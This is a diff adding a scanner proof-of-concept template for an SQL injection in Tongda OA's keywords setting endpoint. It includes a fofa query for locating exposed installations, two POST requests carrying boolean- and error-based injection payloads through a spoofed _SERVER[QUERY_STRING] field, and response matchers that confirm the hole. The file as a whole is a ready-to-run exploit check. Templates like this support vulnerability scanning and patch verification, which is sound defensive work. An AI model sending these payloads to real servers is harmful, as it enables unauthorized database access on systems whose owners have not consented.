@@ -1,0 +1,35 @@
+id: poc-yaml-tongda-setting-keywords-sqli
+info:
+  name: 通达OA /keywords/index SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: POST
+  path: /general/document/index.php/setting/keywords/index
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(1=1,1,exp(710))#
+  expression: 'status_code == 200 && (
+
+    contains(gbk_decode(body),`主题词管理`) || contains(body,`主题词管理`) ) && (
+
+    contains(gbk_decode(body),`确认要批量删除吗`) || contains(body,`确认要批量删除吗`) )
+
+    '
+- method: POST
+  path: /general/document/index.php/setting/keywords/index
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(1=0,1,exp(710))#
+  expression: 'status_code == 500 && (
+
+    contains(gbk_decode(body),`SQL语句执行错误`) || contains(body,`SQL语句执行错误`) ) && (
+
+    contains(gbk_decode(body),`文件`) || contains(body,`文件`) )
+
+    '
+variables: {}
+transport: http
